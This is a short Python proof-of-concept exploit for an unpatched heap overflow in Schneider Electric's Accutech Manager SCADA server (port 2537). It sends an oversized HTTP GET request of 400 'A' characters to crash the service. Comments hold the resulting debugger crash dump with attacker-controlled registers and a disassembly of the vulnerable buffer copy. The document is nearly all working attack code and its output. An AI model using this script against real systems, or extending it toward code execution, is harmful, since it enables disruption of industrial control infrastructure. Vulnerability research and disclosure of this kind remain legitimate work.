#Schneider Electric
#Accutech Manager Server Heap Overflow PoC
#RFManagerService - Port: 2537
#I think this is the same vuln that ExodusIntel discovered. Credit also goes to Aaron Portnoy, ExodusIntel.
#The patch has not been released yet.
#Evren Yalcin, Signalsec Ltd. (www.signalsec.com)
#Download app:
#http://telemetry.schneider-electric.com/id2/media/downloads/software/scadarange/Accutech%20Manager%201.89.2.zip

import socket
import sys
 
host = "192.168.163.128"
 
port = 2537

buf = "\x41" * 400

req = ("GET /" + buf + " HTTP/1.1\r\n"
"Host: " + host + ":" + str(port) + "\r\n")
 
print "  [+] Connecting to %s:%d" % (host, port)
 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
 
s.send(req)
data = s.recv(1024)
s.close()

#(d40.e8c): Access violation - code c0000005 (!!! second chance !!!)
#eax=41414141 ebx=00fd0000 ecx=41414141 edx=0b2999a8 esi=0b2999a0 edi=00000005
#eip=7c91142e esp=0ba3fc28 ebp=0ba3fe48 iopl=0         nv up ei pl zr na pe nc
#cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
#7c91142e 8b39            mov     edi,dword ptr [ecx]  ds:0023:41414141=????????
#----snip----
#text:0040DE91                 push    offset aReceivedReques ; "Received request, parsing...\n"
#.text:0040DE96                 call    nullsub_1
#.text:0040DE9B                 lea     eax, [ebp+cbTransfer]
#.text:0040DEA1                 push    eax             ; char * ; GET /AAAAAAAAAAAAAAAAAAAAAAAAA
#.text:0040DEA2                 push    esi             ; int
#.text:0040DEA3                 call    sub_40E006
#.text:0040DEA8                 add     esp, 0Ch
#----snip---
#call sub_40E006 function copies GET data to staticaly sized heap buffer.